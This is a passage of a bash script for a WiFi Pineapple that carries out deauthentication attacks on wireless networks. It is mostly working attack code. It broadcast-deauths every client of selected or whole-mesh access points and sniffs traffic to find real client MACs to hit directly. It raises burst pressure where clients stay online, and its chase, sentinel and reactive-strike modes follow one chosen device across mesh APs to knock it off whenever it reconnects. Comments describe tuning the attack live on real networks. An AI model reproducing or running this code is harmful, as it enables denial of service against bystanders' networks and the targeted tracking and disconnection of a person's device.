        [ -z "$BSSID" ] && BSSID=$(ask "AP BSSID (MAC)" "$BSSID")
        known_channel=""
        [ -n "$cbssid_nc" ] && known_channel=$(channel_of_bssid "$cbssid_nc")
        CHANNEL=$(ask "Channel" "${known_channel:-${CHANNEL:-6}}")
    else
        say "Not connected to any WiFi network - scanning for nearby ones seen by recon..."
        rows=$(scan_ssid_groups)
        if [ -z "$rows" ]; then
            say "No AP beacons seen by recon yet - enter a target manually."
            BSSID=$(ask "AP BSSID (MAC)" "$BSSID")
            CHANNEL=$(ask "Channel" "$CHANNEL")
        else
            say "Nearby networks (same SSID across multiple APs is grouped - picking one attacks all of them):"
            i=1
            echo "$rows" | while IFS="$(printf '\t')" read -r ssid pairs count signal; do
                printf "  %d) %-28s (%s AP%s)  %sdBm\n" "$i" "$ssid" "$count" "$([ "$count" != "1" ] && echo s)" "$signal"
                i=$((i+1))
            done
            printf "  m) Enter a custom target manually\n"
            sel=$(ask "Pick a network number, or 'm' for manual" "m")
            if [ "$sel" = "m" ] || ! echo "$sel" | grep -qE '^[0-9]+$'; then
                BSSID=$(ask "AP BSSID (MAC)" "$BSSID")
                CHANNEL=$(ask "Channel" "$CHANNEL")
            else
                picked=$(echo "$rows" | sed -n "${sel}p")
                # BUG FOUND AND FIXED: an out-of-range number (or "0", which
                # passes the digits-only check above but isn't a valid list
                # position) made $picked empty - this fell straight through
                # to a nonsensical "Picked '' () AP(s)." message instead of
                # a clear error, then silently continued on to ask for a
                # manual BSSID/channel with no indication the selection was
                # invalid. Fail clearly instead, same pattern already used
                # for an invalid PayloadRunner.sh picker selection.
                [ -z "$picked" ] && die "Invalid selection '$sel' - pick one of the listed numbers."
                SSID_NAME=$(echo "$picked" | cut -f1)
                say "Picked '$SSID_NAME' ($(echo "$picked" | cut -f3) AP(s))."
            fi
        fi
    fi
    # Targets ALL of the AP's clients by default - no per-client prompt.
    # Pass --target yourself (before --pick) if you want just one.
    [ -z "$TARGET" ] && TARGET="FF:FF:FF:FF:FF:FF"
fi

# is_dfs_channel N - is this 5GHz channel one that requires DFS (Dynamic
# Frequency Selection)? Per Hak5's own docs: "DFS channels have stronger
# regulatory requirements which prohibit transmission" - DEAUTH_CLIENT
# will not actually transmit anything on one, full stop, no workaround.
# 52-144 covers the DFS range in both the EU/ETSI and US/FCC regulatory
# domains (only 36-48 and 149-165 are non-DFS everywhere) - a real, live
# example: this device's own neighborhood scan found a real AP on channel
# 140. Attacking a DFS AP wastes a full channel-lock+burst window on a
# channel that can never actually transmit - worth skipping (multi-AP
# modes) or at least warning about (single --bssid, an explicit choice).
is_dfs_channel() {
    local ch="$1"
    [ "$ch" -ge 52 ] 2>/dev/null && [ "$ch" -le 144 ] 2>/dev/null
}

# --ssid (direct, or set by --pick above): expand into MULTI_PAIRS, one
# "bssid~channel" entry per AP broadcasting this SSID.
MULTI_PAIRS=()
if [ -n "$SSID_NAME" ]; then
    [ -f "$RECON_DB" ] || die "Recon database not found at $RECON_DB - has recon run yet?"
    command -v sqlite3 >/dev/null 2>&1 || die "sqlite3 not found on this device."
    group_rows=$(ssid_group_pairs "$SSID_NAME")
    if [ -z "$group_rows" ]; then
        die "No APs found broadcasting SSID '$SSID_NAME' in recon data."
    fi
    dfs_skipped=0
    while IFS='~' read -r raw_bssid raw_channel; do
        [ -z "$raw_bssid" ] && continue
        if is_dfs_channel "$raw_channel"; then
            dfs_skipped=$((dfs_skipped + 1))
            continue
        fi
        MULTI_PAIRS+=("$(format_mac "$raw_bssid")~$raw_channel")
    done <<< "$group_rows"
    if [ "$dfs_skipped" -gt 0 ]; then
        err "Skipped $dfs_skipped AP(s) on DFS channels - transmission is regulatorily blocked there (Hak5's own docs), attacking them would do nothing."
    fi
    [ "${#MULTI_PAIRS[@]}" -eq 0 ] && die "Every AP broadcasting '$SSID_NAME' is on a DFS channel - none of them can be attacked (see above)."
    [ -z "$TARGET" ] && TARGET="FF:FF:FF:FF:FF:FF"
fi

STOPPING=0
_on_stop() { STOPPING=1; }
trap _on_stop INT TERM

# lock_channel CHANNEL SECONDS - BUG FOUND AND FIXED (live-diagnosed - this
# is very likely why "deauth doesn't work" for some networks): recon hops
# channels FAST - confirmed live via `iw dev wlan1mon info`, sampled once
# a second, showing a DIFFERENT channel on nearly every sample. Hak5's own
# docs say DEAUTH_CLIENT "returns immediately - in the background, the
# PineAP system will transmit" the packets, i.e. it's fire-and-forget, not
# synchronous - it does not itself guarantee the radio is actually parked
# on the target's channel at the moment it transmits. If hopping has
# already moved on by then, the deauth frame goes out on the WRONG
# channel and does precisely nothing, even though the command "succeeded"
# with no error. PINEAPPLE_EXAMINE_CHANNEL is Hak5's own documented way to
# pin the radio to one channel for a given number of seconds before it
# auto-resumes hopping - confirmed live it actually holds (radio sampled
# once/sec stayed on the requested channel for the full requested window,
# every time). Locking to the target's channel for the same span as the
# sleep interval, every round, means the radio is reliably sitting on the
# right channel when each deauth actually fires.
#
# BUG FOUND AND FIXED (live-diagnosed, in this fix itself): the first cut
# of this locked for exactly $INTERVAL seconds with a sleep of exactly
# $INTERVAL seconds - live testing (sampling the channel once/sec through
# a whole attack run) caught the radio hopping away for one sample out of
# six, right at the boundary where one lock expires a moment before the
# next iteration's lock call re-establishes it. Locking for longer than
# the sleep (+2s of overlap) closes that gap - re-verified live afterward
# with zero off-channel samples across the same test.
lock_channel() { PINEAPPLE_EXAMINE_CHANNEL "$1" "$(( ${2%.*} + 2 ))" >/dev/null 2>&1; }

# burst_deauth BSSID TARGET CHANNEL - send $BURST back-to-back
# PINEAPPLE_DEAUTH_CLIENT calls instead of just one. Hak5's docs don't
# specify how many disconnect packets one call transmits, but a single
# fire-and-forget round is thin pressure against a client with fast auto-
# reconnect (the exact "works sometimes" signature - mostly-successful
# pings with occasional gaps, not zero connectivity). Repeating the call
# several times within the SAME channel-locked window raises how many
# disconnect frames the client actually sees before it can fully
# reassociate, without changing anything about the channel-lock
# correctness already verified live. No effect on PMF/WPA3 clients - that's
# a protocol wall, not a density problem (see the file header).
#
# MEASURED AND CHANGED: this used to add an extra `sleep 0.2` between each
# call on top of the call's own latency. Measured live: a single
# PINEAPPLE_DEAUTH_CLIENT call already takes anywhere from ~200ms to
# ~950ms in practice (real, variable latency inside Hak5's own
# hak5cmd/pineapd - not something this script controls), which already
# provides real spacing between transmissions on its own. Confirmed live
# (20 rapid-fire calls, zero explicit gap) that back-to-back calls with no
# added sleep all still succeed (rc=0 every time, no dropped/failed
# commands) - so the extra 0.2s bought nothing but a guaranteed 400ms of
# dead time per burst=3 window that could instead go toward actually
# covering more APs/clients in --ssid/--all mode, or just finishing each
# round faster.
burst_deauth() {
    local bssid="$1" target="$2" channel="$3" i=1
    while [ "$i" -le "$BURST" ]; do
        PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
        i=$((i + 1))
    done
}

# discover_clients BSSID_COLONS - IMPROVEMENT: broadcast target
# (FF:FF:FF:FF:FF:FF, Hak5's own documented "all clients" value, what
# --bssid/--ssid/--pick default to) is convenient, but real-world client
# WiFi driver behavior around broadcast-addressed management frames
# varies - some drivers are pickier about them than about a frame
# addressed to their own exact MAC. This briefly (~2s) listens on the
# already-locked target channel via the monitor interface and returns any
# real, non-broadcast, non-multicast MAC addresses actually seen active
# there (most-frequent first, capped at 3 - see the bug-fix note below for
# why this isn't 6 anymore) - so the attack can target them directly too,
# alongside broadcast, without depending on recon's own
# client tracking (confirmed elsewhere in this file - see all_ap_pairs() -
# to be empty/unreliable on this device). Deliberately simple: this reads
# ANY MAC seen in traffic on the channel during the window (via tcpdump
# directly on the interface, the same technique Hak5's own WIFI_PCAP docs
# recommend), not a full 802.11-frame-type parse of which frames actually
# involve this specific BSSID - full frame-type parsing would be a much
# bigger effort for a fairly small accuracy gain. Known limitation, stated
# plainly: if another unrelated AP shares the same channel, its clients
# could get swept in too - low real risk, since a deauth frame claiming to
# be from a BSSID a client isn't actually associated to is normally just
# ignored by that client.
# BUG FOUND AND FIXED (live-caught mid-real-test, real BUG not just a
# tuning nit): this was originally capped at 6 discovered clients PER AP
# - on a real 5-AP mesh with a busy home network (smart plugs, other
# people's devices, etc.), that meant up to 29 total discovered targets
# in one real run. With BURST=3 each PLUS the base per-AP broadcast pass,
# that's 100+ PINEAPPLE_DEAUTH_CLIENT calls per round - at the ~200ms-
# 950ms/call latency measured earlier this session, a single round could
# take 20-90+ real seconds. Any ONE specific device (the actual target
# someone cares about) then only gets hit once per that whole span, with
# a long fully-reconnected gap in between - which is EXACTLY the
# "partial packet loss, not a real disconnect" pattern this whole
# investigation was chasing. More discovered targets isn't better past
# the point where round time balloons - a small, capped list that keeps
# rounds fast and frequent beats an exhaustive one that barely repeats.
# Cap lowered to 3 (see the trailing `head -3` below) - halves the
# worst-case extra-target latency added per round versus the old cap of 6
# while still catching the handful of clients actually worth the direct
# hit alongside the broadcast pass.
discover_clients() {
    local bssid_colons="$1" mon_iface="" dur="2" bssid_lc self_macs known_aps
    [ -e /sys/class/net/wlan1mon ] && mon_iface="wlan1mon"
    [ -z "$mon_iface" ] && [ -e /sys/class/net/wlan0mon ] && mon_iface="wlan0mon"
    [ -z "$mon_iface" ] && return 0
    command -v tcpdump >/dev/null 2>&1 || return 0

    bssid_lc=$(echo "$bssid_colons" | tr 'A-F' 'a-f')
    self_macs=$(cat /sys/class/net/wlan0/address /sys/class/net/wlan1mon/address /sys/class/net/wlan0mon/address 2>/dev/null | tr 'A-F' 'a-f')

    # BUG FOUND AND FIXED (live-diagnosed - CRITICAL, explains a huge
    # amount of "why doesn't this disconnect real devices" confusion this
    # whole session): this used to only exclude the ONE BSSID passed in
    # as $1, plus broadcast and this device's own MACs. On a MESH
    # network, sibling APs talk to each other over wireless backhaul, and
    # their own MAC addresses show up as ordinary-looking unicast traffic
    # on OTHER APs' channels. Confirmed live via a real capture: every
    # single "still-active client" MAC the escalation mechanism had been
    # chasing and re-attacking - 5 for 5 - was actually one of the SAME
    # mesh's own AP BSSIDs, cross-referenced directly against recon's own
    # AP list. The entire "extra discovered client" mechanism (this
    # function, used by run_attack_loop/run_multi_bssid_loop AND
    # escalate_check()) had been treating the mesh's own infrastructure
    # as if it were end-user devices - which of course never
    # "disconnects", since DEAUTH_CLIENT sent to another AP's own BSSID
    # isn't a meaningful attack on anything. This plausibly explains a
    # large share of "deauth doesn't seem to do anything" reports against
    # mesh networks specifically. Fix: exclude EVERY known AP BSSID from
    # recon (not just the one being scanned right now) - a real access
    # point's own MAC should never be treated as a client to attack,
    # regardless of which network it belongs to.
    known_aps=""
    known_ap_suffixes=""
    if [ -f "$RECON_DB" ] && command -v sqlite3 >/dev/null 2>&1; then
        # BUG FOUND AND FIXED (same uncast `!= ''` BLOB/TEXT gap as the
        # scan_ssid_groups()/ssid_group_pairs()/all_ap_pairs() queries
        # above - `bssid != ''` never excludes anything since a BLOB is
        # never equal to a TEXT literal. Low practical impact at this
        # specific call site - an empty line slipping into $known_aps
        # can't falsely exclusive-match a real, non-empty discovered MAC
        # via the exact-match `grep -qx` below - but fixed for the same
        # correctness reason and to stay consistent with the other three).
        known_aps=$(sqlite3 "$RECON_DB" \
            "SELECT DISTINCT bssid FROM ssid WHERE type = 8 AND bssid IS NOT NULL AND CAST(bssid AS TEXT) != '';" \
            2>/dev/null | tr 'A-F' 'a-f')
        # BUG FOUND AND FIXED (live-diagnosed, second round of the same
        # investigation as the known_aps exclusion above): even with every
        # beacon-observed AP BSSID excluded, a live test still showed a
        # "still-active client" MAC (6a:5d:35:12:96:35) that turned out to
        # be neither a real client NOR any AP recon had ever beacon-
        # captured - confirmed absent from BOTH recon's full history and a
        # fresh `iw scan` right at the moment of the test. But it shared
        # its last 5 octets EXACTLY with a real, known AP BSSID
        # (48:5d:35:12:96:35), differing only in the first octet. That's
        # the standard vendor pattern for a mesh node's dedicated wireless
        # BACKHAUL address (inter-AP data traffic, distinct from the
        # client-facing BSSID) - and by design, a backhaul address never
        # beacons and never answers a probe/scan, so no amount of waiting
        # for recon to "catch up" would ever add it to known_aps. Fix:
        # also exclude any discovered MAC whose last 5 octets exactly
        # match a known AP's last 5 octets, regardless of the first octet -
        # catches backhaul addresses derived from ANY known AP, not just
        # this specific mesh, without needing to special-case one vendor.
        known_ap_suffixes=$(echo "$known_aps" | sed -E 's/^..(..........)$/\1/')
    fi

    timeout "$dur" tcpdump -nn -i "$mon_iface" 2>/dev/null \
        | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' \
        | tr 'A-F' 'a-f' \
        | sort | uniq -c | sort -rn | awk '{print $2}' \
        | while read -r mac; do
            [ "$mac" = "ff:ff:ff:ff:ff:ff" ] && continue
            [ "$mac" = "$bssid_lc" ] && continue
            echo "$self_macs" | grep -qx "$mac" && continue
            # Skip multicast/group-addressed MACs (first octet's low bit
            # set, standard 802 addressing rule) - not real client MACs.
            [ $(( 0x${mac%%:*} % 2 )) = 1 ] && continue
            # BUG FOUND (live-caught during a real attack run, not
            # hypothetical): escalate_check() reported the exact same
            # "still-active client" MAC (fe:ff:ff:ff:ff:ff - one single
            # bit off the broadcast address ff:ff:ff:ff:ff:ff) as active
            # on every one of 4 attacked APs in one pass, including two on
            # DIFFERENT frequency bands (2.4GHz and 5GHz) - physically
            # impossible for one genuine client, which can only be
            # transmitting on one channel at a time. Consistent with a
            # corrupted/bit-flipped broadcast frame (a known real-world
            # monitor-mode phenomenon - weak signal or RF noise flips a
            # bit before the exact-match "ff:ff:ff:ff:ff:ff" check above
            # ever sees it) being mistaken for a persistent real client
            # and escalated against indefinitely. Skip any address 5 or
            # more of whose 6 octets are literally "ff" - a genuine
            # client landing there by chance is astronomically unlikely
            # (no vendor OUI starts ff:ff:ff, and a randomized MAC hitting
            # this pattern is roughly 1 in 256^5), so this costs nothing
            # real while catching this exact failure mode.
            if [ "$(echo "$mac" | tr ':' '\n' | grep -c '^ff$')" -ge 5 ]; then
                continue
            fi
            # Skip ANY known AP BSSID (mesh backhaul traffic, or a
            # neighboring unrelated network's AP sharing this channel) -
            # see the critical bug-fix comment above. recon.db stores
            # BSSIDs with no separators, so strip colons before comparing.
            mac_nc=$(echo "$mac" | tr -d ':')
            echo "$known_aps" | grep -qx "$mac_nc" && continue
            # Skip a mesh backhaul address derived from a known AP (same
            # last 5 octets, different first octet only) - see the
            # bug-fix comment above.
            mac_suffix="${mac_nc:2}"
            echo "$known_ap_suffixes" | grep -qx "$mac_suffix" && continue
            echo "$mac"
        done | head -3
}

# run_attack_loop - repeat PINEAPPLE_DEAUTH_CLIENT against one BSSID/TARGET/
# CHANNEL every $INTERVAL seconds until stopped (Ctrl+C in the foreground,
# or `deauth.sh --stop` killing the PID when backgrounded). A single call
# only sends one round of disconnect packets - real clients reassociate
# within a second or two, so this is what actually keeps them off.
run_attack_loop() {
    track_foreground_pid
    local bssid="$1" target="$2" channel="$3"
    local extra=()
    if [ "$DISCOVER" = "1" ] && [ "$(echo "$target" | tr 'a-f' 'A-F')" = "FF:FF:FF:FF:FF:FF" ]; then
        say "Listening on channel $channel for real client MACs (~2s) to target directly alongside broadcast..."
        lock_channel "$channel" 3
        local found m
        found=$(discover_clients "$bssid")
        if [ -n "$found" ]; then
            while IFS= read -r m; do [ -n "$m" ] && extra+=("$m"); done <<< "$found"
            say "Found ${#extra[@]} real client MAC(s): ${extra[*]}"
        else
            say "No additional client MACs seen yet - continuing with broadcast target only."
        fi
    fi
    say "Deauthing $target from $bssid (channel $channel), burst of $BURST every ${INTERVAL}s..."
    [ "$BACKGROUND" != "1" ] && say "Press Ctrl+C to stop."
    # BUG FOUND AND FIXED (live-caught DURING a real test with a real
    # client - this is the same "wrong channel" bug class already fixed
    # once this session, reintroduced by the client-MAC discovery feature
    # added in this same round): the lock used to be taken ONCE per round
    # (for $INTERVAL+2s) and assumed to still be valid through the
    # PRIMARY burst AND every discovered extra client's burst tacked on
    # after it - with up to 6 total targets x $BURST calls each, and each
    # PINEAPPLE_DEAUTH_CLIENT call measured to take anywhere from ~200ms
    # to ~950ms, a round's real total work can run well past the lock's
    # duration, especially once discovery adds several extra targets.
    # Caught this live: channel-sampling during an active multi-target
    # attack showed DFS channels appearing mid-round (recon can only be
    # hopping there if our lock had already silently expired) - some
    # fraction of each round's later deauth calls were firing off-channel
    # and doing nothing, exactly the effectiveness gap being chased. Fix:
    # lock again before EVERY burst_deauth call, not once per round - a
    # fixed, generous 5s (not tied to $INTERVAL, which could be shorter
    # than a single burst already takes) comfortably covers one burst's
    # worst-case real-world timing.
    while [ "$STOPPING" != "1" ]; do
        lock_channel "$channel" 5
        burst_deauth "$bssid" "$target" "$channel"
        for m in "${extra[@]}"; do
            [ "$STOPPING" = "1" ] && break
            lock_channel "$channel" 5
            burst_deauth "$bssid" "$m" "$channel"
        done
        sleep "$INTERVAL" &
        wait $!
    done
    PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1
    say "Stopped."
}

# attack_ap_pairs TARGET "bssid~channel" [...] - one pass over the given
# (already channel-sorted) AP list, locking before every single AP's
# burst. This is the WHOLE-RANGE path (broadcast target hits every
# client of every AP) - what --all/--ssid actually use for "disrupt the
# whole mesh", not a single-device mechanism.
#
# REVERTED A PRIOR "OPTIMIZATION" (live-caught mid-real-test): this used
# to skip re-locking when consecutive APs in the list shared a channel,
# on the theory that a lock already covering that channel doesn't need
# re-confirming. That reasoning only holds if the lock's time budget
# always covers the ACTUAL work done under it - it doesn't: each
# PINEAPPLE_DEAUTH_CLIENT call measured anywhere from ~200ms to ~950ms in
# practice, so a run of several same-channel APs (this device's own
# neighborhood regularly shows 8+ APs in one mesh) can burn well past the
# lock's duration before the group finishes, same root cause as the fix
# just made in run_attack_loop above. Caught this live: channel-sampling
# during a real multi-AP attack showed DFS channels appearing mid-round -
# only possible if recon's own hopping had already resumed, meaning the
# lock had silently expired and later APs in the group were being
# attacked off-channel. The skip-optimization traded correctness for a
# speed gain that was never actually safe - re-locking every AP (cheap
# relative to burst_deauth's own cost) is the right tradeoff.
#
# ESCALATION (see escalate_check() below): each AP's burst count scales
# with AP_ESCALATION[bssid] - normally 0 (just $BURST), but bumped when
# escalate_check() has actually OBSERVED that AP still has active client
# traffic despite being attacked (real measured evidence it's not
# working yet on that specific AP), capped at MAX_ESCALATION extra.
attack_ap_pairs() {
    local target="$1"; shift
    local bssid channel esc round_burst i
    for pair in "$@"; do
        [ "$STOPPING" = "1" ] && break
        bssid="${pair%%~*}"; channel="${pair#*~}"
        lock_channel "$channel" 5
        esc="${AP_ESCALATION[$bssid]:-0}"
        round_burst=$(( BURST + esc ))
        i=1
        while [ "$i" -le "$round_burst" ]; do
            PINEAPPLE_DEAUTH_CLIENT "$bssid" "$target" "$channel"
            i=$((i + 1))
        done
    done
}

# escalate_check "bssid~channel" [...] - DYNAMIC ESCALATION: briefly
# re-listens on each AP's channel for real client traffic AFTER it's
# already been attacked this round. If a client is still transmitting
# there despite the deauth burst just sent, that AP's escalation level
# goes up (more packets per burst next round, capped at MAX_ESCALATION
# extra) - if the AP looks quiet, its level decays back down. This is
# "try normal first, escalate what's not working" made concrete and
# MEASURED (real passive observation, not a guess) rather than applying
# the same fixed pressure to every AP regardless of whether it's
# actually succeeding there. Only called periodically (see
# ESCALATE_EVERY_N_ROUNDS below), not every round - it adds real
# listening cost (lock+2s per AP) on top of the attack itself.
declare -A AP_ESCALATION
MAX_ESCALATION=5
ESCALATE_EVERY_N_ROUNDS=3
escalate_check() {
    local pair bssid channel found lvl active=0 quiet=0
    for pair in "$@"; do
        [ "$STOPPING" = "1" ] && break
        bssid="${pair%%~*}"; channel="${pair#*~}"
        lock_channel "$channel" 3
        found=$(discover_clients "$bssid")
        lvl="${AP_ESCALATION[$bssid]:-0}"
        if [ -n "$found" ]; then
            active=$((active + 1))
            lvl=$((lvl + 1))
            [ "$lvl" -gt "$MAX_ESCALATION" ] && lvl="$MAX_ESCALATION"
            if [ "$lvl" -gt "${AP_ESCALATION[$bssid]:-0}" ]; then
                # BUG FOUND AND FIXED (found via live testing - genuinely
                # confusing, not a client-tracking bug like it first
                # looked): this used to log "$bssid" here, which is the
                # AP BEING CHECKED (one of the mesh's own APs, by
                # definition - that's what $pairs contains) - NOT the
                # actual client MAC $found discovered there. Every message
                # necessarily named a mesh AP address, making it look
                # exactly like the real discover_clients() bug fixed
                # elsewhere in this file (mesh backhaul mistaken for
                # clients) even when discover_clients() was correctly
                # excluding AP BSSIDs and finding genuine client MACs.
                # Now shows what was ACTUALLY found, so this is legible
                # instead of misleading.
                say "Still-active client(s) [$(echo "$found" | tr '\n' ' ')] seen on AP $bssid despite attack - escalating (burst now $((BURST + lvl)))."
            fi
        else
            quiet=$((quiet + 1))
            lvl=$((lvl - 1))
            [ "$lvl" -lt 0 ] && lvl=0
        fi
        AP_ESCALATION["$bssid"]="$lvl"
    done
    # UX FIX (found via live testing - a real broadcast run stayed
    # completely silent about escalation the whole way through, no way to
    # tell whether "no escalation" meant "it's working" or "the listen
    # window just isn't catching anything"): always report what THIS check
    # actually observed, not just the escalation events. $quiet APs with
    # zero escalation events is genuinely good news (no active clients
    # detected right after being attacked) - say so explicitly instead of
    # leaving it ambiguous.
    say "Activity check: $active AP(s) still show client traffic, $quiet AP(s) quiet."
}

# sort_pairs_by_channel "bssid~channel" [...] - prints one pair per line,
# sorted by channel, so attack_ap_pairs's same-channel grouping above
# actually finds adjacent matches instead of relying on source order.
sort_pairs_by_channel() { printf '%s\n' "$@" | sort -t'~' -k2,2n; }

# find_target_bssid TARGET_MAC "bssid~channel" [...] - CHASE MODE's core
# mechanism (see file header): briefly locks each AP's channel and
# listens for TARGET_MAC's own traffic, short-circuiting on the first
# hit. Pass the most-likely-first (e.g. the last-known location) to make
# the common "hasn't moved" case cheap - one AP checked, not the whole
# group. Built for mesh networks with roaming (802.11k/v/r): deauthing
# one AP just bounces a client to a sibling AP near-invisibly, so
# tracking WHERE it actually went matters more than blindly hitting
# every AP on a fixed schedule.
#
# BUG FOUND AND FIXED (live-verified, same root cause as the "-e" fix in
# run_reactive_strike()/start_sentinel() - see their header comments): the
# tcpdump call here had no "-e", so it relied entirely on catching the
# target via a DATA frame's default one-line summary (which does print
# addr2/addr3 without -e, confirmed live) - management frames (Probe
# Request, Authentication, (Re)Association) print NO MAC address at all
# without it. That's a real gap for chase mode's actual use case: right
# after a roam, the target is mid-handshake and hasn't necessarily pushed
# any data traffic yet - exactly the moment "where did it go" matters
# most, and exactly what the old pattern would miss, only picking the
# target up a beat later once ordinary data traffic resumed. Confirmed
# live via a synthetic pcap: the unmodified pattern found a target's DATA
# frame but NOT its Authentication/Assoc/ReAssoc frames; adding "-e" (at
# zero cost - existing data-frame detection is unaffected) catches both.
find_target_bssid() {
    local target="$1"; shift
    local mon_iface="" pair bssid channel
    [ -e /sys/class/net/wlan1mon ] && mon_iface="wlan1mon"
    [ -z "$mon_iface" ] && [ -e /sys/class/net/wlan0mon ] && mon_iface="wlan0mon"
    [ -z "$mon_iface" ] && return 1
    command -v tcpdump >/dev/null 2>&1 || return 1
    for pair in "$@"; do
        [ "$STOPPING" = "1" ] && return 1
        bssid="${pair%%~*}"; channel="${pair#*~}"
        lock_channel "$channel" 2
        if timeout 1 tcpdump -nn -e -i "$mon_iface" 2>/dev/null | grep -qi "$target"; then
            echo "$pair"
            return 0
        fi
    done
    return 1
}

# SENTINEL (dual-radio passive sensing, /invent round 2 - see file
# header): the internal radio (phy0/wlan0mon) has sat completely idle
# since --second-radio/raw injection was removed for causing hard hangs.
# But the entire crash history was tied to TRANSMITTING forged frames via
# scapy - plain monitor-mode LISTENING on wlan0mon (iw channel-set +
# tcpdump) was used safely all session with zero incidents (chase mode,
# discover_clients() both do exactly this on wlan1mon; the mechanism
# doesn't become dangerous just because it's the other radio). Dedicating
# the otherwise-idle internal radio to passive-only watching on a
# DIFFERENT channel than whatever the primary radio is currently
# attacking gives simultaneous two-channel awareness instead of one radio
# time-slicing between sensing and striking - never transmits anything,
# so it carries none of the injection risk. A sighting is written to a
# small state file (SENTINEL_STATE) for the main strike loop to consume,
# rather than any shared-memory/signal mechanism this busybox/bash
# environment doesn't have clean primitives for. SENTINEL_PIDFILE/
# SENTINEL_STATE/sentinel_running()/stop_sentinel() are defined early in
# this file (alongside PIDFILE/is_running), not here - see that comment
# for why.
#
# start_sentinel TARGET "bssid~channel" [...] - only starts if wlan0mon
# exists and isn't the SAME interface the main loop is already using
# (single-radio devices have nothing spare to dedicate - the main loop's
# own per-AP watching already covers that case alone, this is a bonus on
# top when a second radio is actually present). wlan0 (plain managed-mode
# interface sharing the same physical radio as wlan0mon) has to come down
# first - confirmed elsewhere in this file's history that wlan0mon can't
# independently set its channel while wlan0 is up ("Resource busy").
start_sentinel() {
    local target="$1"; shift
    local pairs=("$@")
    [ -d /sys/class/net/wlan0mon ] || return 1
    [ "$MON_IFACE" = "wlan0mon" ] && return 1
    command -v tcpdump >/dev/null 2>&1 || return 1
    local target_lc
    target_lc=$(echo "$target" | tr 'A-F' 'a-f')
    rm -f "$SENTINEL_STATE"
    ip link set wlan0 down 2>/dev/null
    (
        trap '' HUP
        while true; do
            for pair in "${pairs[@]}"; do
                # BUG FOUND AND FIXED: this loop had no way to notice its
                # own parent died. The main run_reactive_strike process
                # normally cleans this up via stop_sentinel() (in its own
                # post-loop cleanup, or unconditionally from --stop) - but
                # a FOREGROUND run (no --background) has no HUP trap of
                # its own (only the --background wrapper sets `trap ''
                # HUP`), so a dropped SSH session sending SIGHUP would kill
                # the main process outright, without ever reaching either
                # cleanup path. Unlike the main attack loop's channel lock
                # (PINEAPPLE_EXAMINE_CHANNEL), which self-expires on its
                # own even with nothing watching, this `while true` has NO
                # self-limit at all - an orphaned sentinel would keep
                # cycling wlan0mon's channel and running tcpdump, with
                # wlan0 left down, indefinitely, until a human noticed and
                # ran `deauth.sh --stop` (or reset.sh) by hand. Same
                # `kill -0 "$PPID"` self-check sniff.sh's own analogous
                # background watchers (run_creds_watcher/run_packet_feed)
                # already use for exactly this reason - $PPID here is this
                # subshell's real parent, the process running
                # run_reactive_strike/start_sentinel. Restores wlan0 and
                # cleans up its own files itself before exiting - it's the
                # only thing left that CAN, since the parent that would
                # normally do this via stop_sentinel() is exactly what's
                # gone in this scenario.
                if ! kill -0 "$PPID" 2>/dev/null; then
                    ip link set wlan0 up 2>/dev/null
                    rm -f "$SENTINEL_PIDFILE" "$SENTINEL_STATE"
                    exit 0
                fi
                local bssid="${pair%%~*}" channel="${pair#*~}"
                iw dev wlan0mon set channel "$channel" 2>/dev/null
                # -e prints the frame's link-layer addresses (BSSID/DA/SA)
                # on the same summary line - see run_reactive_strike()'s
                # own header comment for why this is required, not
                # optional: without it, a management-frame line (auth/
                # assoc/reassoc) carries NO MAC address at all, so the
                # target-MAC grep just below could never match anything,
                # ever, regardless of the frame-type keyword.
                hit=$(timeout 3 tcpdump -nn -e -l -i wlan0mon 2>/dev/null \
                    | grep -iE "Authentication|Assoc Request|ReAssoc Request" \
                    | grep -i "$target_lc")
                [ -n "$hit" ] && echo "$pair" > "$SENTINEL_STATE"
            done
        done
    ) &
    echo $! > "$SENTINEL_PIDFILE"
}

# run_reactive_strike TARGET "bssid~channel" [...] - REACTIVE MODE (see
# file header): instead of a fixed-interval polling loop, continuously
# watches each AP's channel for the target's OWN authentication/
# (re)association attempt, and strikes the instant one is seen instead of
# waiting out a scheduled round. Built because live testing showed
# escalating burst pressure (3->5) against an already-located target had
# ZERO observed effect - it reassociates within 1-2s, faster than a full
# multi-AP round can complete. The bottleneck is reaction LATENCY, not
# attack strength, so this closes the gap directly instead of pushing
# harder on the same slow schedule.
#
# v2 (/invent round 2) adds two more mechanisms on top of the base watch-
# then-strike loop:
#
#   1. SENTINEL - see start_sentinel() above: a second, otherwise-idle
#      radio watches a DIFFERENT channel simultaneously, so a sighting
#      isn't limited to whatever one channel the primary radio happens
#      to be parked on right now. Checked once per primary-loop iteration
#      (cheap - just reading a small file, not a new tcpdump call) and
#      acted on immediately if present.
#
#   2. PROVOKE-THEN-AMBUSH - a real gap in v1: pure reactive watching only
#      fires if the target happens to attempt a reconnection on its own.
#      Once a client settles into a stable association, it may generate
#      very few fresh auth/reassoc events to react to at all, making a
#      purely passive watcher mostly idle. Periodically firing a light
#      broadcast burst (every PROVOKE_EVERY_N_CYCLES) manufactures more
#      reconnection events for the watcher to catch, instead of waiting
#      indefinitely for organic ones - "provoke, then ambush the result"
#      rather than treating attack and watch as mutually exclusive.
#
# BUG FOUND AND FIXED (live-verified against this exact tcpdump binary,
# not a guess): this was originally written while the device was offline,
# grepping for the RFC/802.11-spec frame names "Association Request" /
# "Reassociation Request". Matching approach deliberately mirrors the
# ALREADY-PROVEN pattern used by discover_clients()/find_target_bssid()
# above (grep on tcpdump's own decoded text output) rather than a BPF
# filter primitive (`wlan type mgt subtype auth`, `wlan addr2 ...`) -
# those are documented libpcap keywords, but whether THIS tcpdump build
# was compiled with 802.11 filter-primitive support specifically (a
# separate thing from just decoding/printing frame types, which IS
# confirmed working) hasn't been verified.
#
# Verified live via a synthetic pcap (scapy-crafted Dot11Auth/Dot11AssoReq/
# Dot11ReassoReq frames, fed through `tcpdump -r` on this exact device/
# binary - no airtime needed, no real client required): "Beacon",
# "Disassociation", and "DeAuthentication" print as plain text exactly as
# assumed, and "Authentication" does too - but this tcpdump's 802.11
# decoder actually labels the other two frame types "Assoc Request" and
# "ReAssoc Request" (abbreviated, NOT the full spec names this was
# grepping for). The old pattern would have matched real Authentication
# frames but silently NEVER matched a real (re)association attempt -
# reactive mode and the sentinel would have looked like they were working
# (no error, no warning) while actually missing most of what they exist
# to catch. Keyword list below now matches the real observed strings.
#
